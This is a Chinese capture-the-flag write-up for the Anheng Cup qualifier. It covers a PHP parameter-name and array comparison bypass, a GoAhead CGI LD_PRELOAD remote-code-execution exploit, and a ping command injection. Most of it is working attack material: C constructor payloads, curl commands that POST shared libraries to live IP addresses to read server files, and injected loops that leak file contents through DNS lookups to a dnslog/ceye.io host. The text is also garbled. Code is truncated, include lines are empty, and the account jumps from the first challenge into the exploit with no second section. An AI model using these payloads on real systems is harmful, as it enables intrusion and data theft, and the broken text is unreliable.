## 前言
渣渣一枚，萌新一个，划了安恒杯秋季选拔赛，题目扎心(Orz.jpg）
个人写的writrup大佬轻喷(QAQ)
### 一：奇怪的恐龙特性
这是我做的第一题，感觉还可以一道代码审计的题目，发现了一个我以前没见过的知识点，可以详细看看这个链接
从上面可以看出，简单点解释就是当代码中存在`$_REQUEST['user_id']`里面类似的参数的时候，我们在`url`上可以这样`a.php?user.id`
传参去进行绕过,这样进去之后也能表示`$_REQUEST['user_id']`的值，同样可以绕过的符号还有`+``.``[`
等，应该说是`php`的一个小特性，上面讲的很清楚了
    0) {
        echo 'A_A,too big';
        }
        else{
        echo file_get_contents('flag.php');
        }
         ?>
阅读代码发现，首先第一步要绕过`A_A`这个符号，如果出现这个符号他就会显示`A_A,have
fun`，就不能继续往下面执行到`file_get_contents('flag.php')`了，
但是我们发送`get`参数的时候又必须要发送，因此我们就用到刚才的知识点，我们可以用`A.A`或者是`A+A`去传参去绕过。
下面的代码就是常规的数字绕过了，但这里也用到了一个`trick`，就是无论你的数字多大，对于数组而言总是比数组小，下面是操作
所以说，我们可以利用数组去绕过`$str
漏洞利用也非常简单
payload.c
    # PoC/payload.c
    #include 
    static void before_main(void) __attribute__((constructor));
    static void before_main(void)
    {
    write(1, "Hello: World!\n", 14);
    }
然后gcc成so文件：`gcc -shared -fPIC ./payload.c -o payload.so`
然后攻击
    curl -X POST --data-binary @payload.so http://ip/hello.cgi?LD_PRELOAD=/proc/self/fd/0 -i
可以得到回显
    HTTP/1.1 200 OK
    Date: Sun Dec 17 13:08:20 2017
    Transfer-Encoding: chunked
    Connection: keep-alive
    X-Frame-Options: SAMEORIGIN
    Pragma: no-cache
    Cache-Control: no-cache
    hello:  World!
    Content-type: text/html
只要出现hello: World!就说明攻击成功了
那么下面构造我们的攻击payload
首先是找文件的绝对路径 使用c语言进行操作，c语言实现执行命令的脚本网上一搜一大堆，
最后发现是www目录下的goahead文件夹
然后读文件
    #include "stdio.h"  
    #include 
    #include 
    #include 
    #include 
    static void before_main(void) __attribute__((constructor));
    static void before_main(void){
    char filename[] = "/var/www/goahead/cgi-bin/hello.cgi"; 
     FILE *fp; 
     char StrLine[1024];
     if((fp = fopen(filename,"r")) == NULL) 
     { 
     printf("error!"); 
     return -1; 
     } 
     while (!feof(fp)) 
     { 
     fgets(StrLine,1024,fp);  
     printf("%s\n", StrLine); 
     } 
     fclose(fp); 
    }
即可拿到flag
    curl -X POST --data-binary @payload.so http://192.168.5.42:8080/cgi-bin/hello.cgi?LD_PRELOAD\=/proc/self/fd/0 -i
    HTTP/1.1 200 OK
    Server: GoAhead-http
    Date: Sun Jan 21 04:31:28 2018
    Transfer-Encoding: chunked
    Connection: keep-alive
    X-Frame-Options: SAMEORIGIN
    Pragma: no-cache
    Cache-Control: no-cache
    Content-Type:  text/html
    Hello GOGOGO#!/usr/bin/perl
    print "Content-Type: text/html\n\n";
    print "Hello GOGOGO";
    #flag{ef9f1f880e1f001bedd32bfc52674128}
    #flag{ef9f1f880e1f001bedd32bfc52674128}
#### 另一种操作
进去查看相应头Server: GoAhead-http，查找资料，这个cgi存在代码执行漏洞
网上的POC大多为反弹shell，这道题由于服务器配置问题无法实现，有题干知flag在cgi-bin/hello.cgi中，故只需要执行代码读取cgi文件即可
Linux中编写如下代码（我开始想复杂了，还想调用popen执行cat读取，只需要fread就可以了）：
    //poc.c
    #include 
    #include 
    #include 
    static void before_main(void) __attribute__((constructor));
    static void before_main(void){  
        FILE* fp = fopen("cgi-bin/hello.cgi", "r");
        char buf[2048];
        fread(buf, sizeof(buf), 1, fp);
        write(1, buf, sizeof(buf));
    }
执行指令编译动态库并发送`payload`：
    gcc -shared -fPIC poc.c -o poc.so && curl -X POST --data-binary @poc.so http://114.55.36.69:8018/cgi-bin/hello.cgi?LD_PRELOAD=/proc/self/fd/0 -i --output 1.txt
读取1.txt获得flag：`flag{ef9f1f880e1f001bedd32bfc52674128}`
### 三：ping
这是一个命令执行题。通过`get`传入`ping`参数，后台使用`system(‘ping’,
$_GET[‘ping’])`来执行命令。不过在执行之前把`'’`给过滤了，
也就是说无法使用重定向来`cat flag`文件的值（就算不过滤我也不知道咋利用）。刚好前几天看到了关于`dnslog`在盲注中的利用，
就想，`dnslog`能不能在这里用到？试试吧。
先试试`dnslog`能不能用：
    ?ping=111.13.100.91(百度的ip) -c 1; ping `uname`.****.ceye.io(记录dns查询的平台域名)
打开`dnslog`平台，果然发现了一条记录：`linux.****.ceye.io`。嘻嘻。既然你那么直接，我也就跟你直接点啦！接招:
    ?ping=111.13.100.91 -c 1; ping  `cat where_is_flag.php`.****.ceye.io
按完回车，心想，`flag`那么容易就到手了？回到平台看一看，没有！又试了几遍，还是不行！仔细一想，
有可能被文件中的空格和换行符干扰到了，那就编码一下呗。便把payload换成`cat where_is_flag.php | base64`，回去看，
还是不行。。大招用完了，剩下的只好请教百度。果然找到了个好姿势：
    for i in $(ls /);do curl "http://$i.xxx.dnslog.link/";done;
换成自己的payload：
    ?ping=111.13.100.91 -c 1; for i in $(cat where_is_flag.php); do ping " $i.****.ceye.io"; done;
终于成功了，这个文件的内容是真正flag文件的相对路径，将payload稍微改一下就好了。